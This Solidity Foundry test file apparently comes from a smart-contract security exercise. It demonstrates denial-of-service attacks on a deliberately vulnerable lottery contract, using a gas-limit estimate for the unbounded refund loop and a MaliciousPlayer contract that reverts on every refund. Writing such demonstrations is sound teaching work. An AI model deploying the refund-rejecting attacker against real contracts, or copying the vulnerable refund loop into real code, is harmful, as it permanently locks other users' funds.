// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/v8/VulnerableLottery.sol";

/**
 * @title MaliciousPlayer
 * @notice Joins lottery but rejects refunds to DoS the cancel() function
 */
contract MaliciousPlayer {
    receive() external payable {
        revert("I refuse to accept refunds");
    }
}

contract DenialOfService is Test {
    VulnerableLottery lottery;
    uint256 constant PARTICIPANTS = 10;

    function setUp() public {
        console.log("=== SETUP ===");
        lottery = new VulnerableLottery();
        console.log("  VulnerableLottery deployed\n");
    }

    function addParticipants() internal {
        for (uint256 i = 0; i < PARTICIPANTS; i++) {
            address player = address(uint160(i + 1000));
            vm.deal(player, 2 ether);
            vm.prank(player);
            lottery.join{ value: 1 ether }();
        }
    }

    function testUnboundedLoopDoS() public {
        console.log("=== UNBOUNDED LOOP DoS ATTACK ===\n");

        // Add normal participants
        addParticipants();

        console.log("  Total players:", lottery.getPlayers().length);
        console.log("  Cancelling lottery...");
        uint256 gasBefore = gasleft();
        lottery.cancel();
        uint256 gasUsed = gasBefore - gasleft();
        console.log("  Gas used:", gasUsed);

        uint256 gasPerPlayer = gasUsed / PARTICIPANTS;
        console.log("  Gas used per player:", gasPerPlayer, "gas");
        console.log("  Max players before DoS (block gas limit ~30M):", 30_000_000 / gasPerPlayer);
        console.log("  Max players + 1 => Transaction reverts and Lottery ETH is permanently lost");
    }

    function testRevertBasedDoS() public {
        console.log("=== REVERT-BASED DoS ATTACK ===\n");

        // Add normal participants
        addParticipants();

        // Attack: Add a player that will revert on refund
        MaliciousPlayer attacker = new MaliciousPlayer();
        vm.deal(address(attacker), 2 ether);
        vm.prank(address(attacker));
        lottery.join{ value: 1 ether }();

        console.log("  Malicious player joined the lottery");
        console.log("  Total players:", lottery.getPlayers().length);
        console.log("  Cancelling lottery...");

        vm.expectRevert("Refund failed");
        lottery.cancel();

        console.log("  Cancellation reverted due to malicious player");
        console.log("  Lottery ETH is permanently lost as no one can be refunded");
    }
}
